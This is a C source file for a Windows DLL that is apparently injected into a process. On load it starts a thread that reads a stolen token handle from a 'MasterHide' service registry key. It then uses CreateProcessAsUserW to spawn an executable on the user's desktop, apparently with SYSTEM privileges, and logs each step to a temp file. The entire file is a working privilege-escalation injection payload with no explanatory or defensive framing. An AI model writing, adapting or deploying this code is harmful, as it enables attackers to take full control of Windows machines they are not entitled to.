#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

static void Log(const wchar_t* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    wchar_t buf[512];
    _vsnwprintf_s(buf, _countof(buf), _TRUNCATE, fmt, args);
    va_end(args);

    FILE* f = _wfopen(L"C:\\Windows\\Temp\\inject_log.txt", L"a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fwprintf(f, L"[%02d:%02d:%02d.%03d TID %lu] %s\n",
            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
            GetCurrentThreadId(), buf);
        fclose(f);
    }
}

DWORD WINAPI SpawnSystemCmd(LPVOID lpParam)
{
    Log(L"SpawnSystemCmd started");

    HANDLE hToken = NULL;
    for (int i = 0; i < 300; i++) {
        HKEY hKey;
        LONG lRet = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services\\MasterHide",
            0, KEY_READ, &hKey);
        if (lRet == ERROR_SUCCESS) {
            DWORD handleValue = 0, size = sizeof(DWORD);
            lRet = RegQueryValueExW(hKey, L"TokenHandle", NULL, NULL, (BYTE*)&handleValue, &size);
            RegCloseKey(hKey);
            if (lRet == ERROR_SUCCESS && handleValue != 0) {
                hToken = (HANDLE)(ULONG_PTR)handleValue;
                Log(L"Got token handle: %p", hToken);
                break;
            }
        }
        else {
            if (i % 30 == 0)
                Log(L"RegOpenKeyEx attempt %d failed, lRet=%ld", i, lRet);
        }
        Sleep(100);
    }

    if (!hToken) {
        Log(L"No token found after 30 seconds");
        return 1;
    }

    Log(L"Calling CreateProcessAsUserW...");
    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = L"WinSta0\\Default";
    PROCESS_INFORMATION pi = { 0 };

    BOOL success = CreateProcessAsUserW(
        hToken,
        L"C:\\Windows\\System32\\jtl.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi
    );

    Log(L"CreateProcessAsUserW = %d, err = %lu, pid = %lu",
        success, success ? 0 : GetLastError(), pi.dwProcessId);

    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    Log(L"SpawnSystemCmd exiting, result = %d", success ? 0 : 1);
    return success ? 0 : 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        Log(L"DLL loaded");
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(NULL, 0, SpawnSystemCmd, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}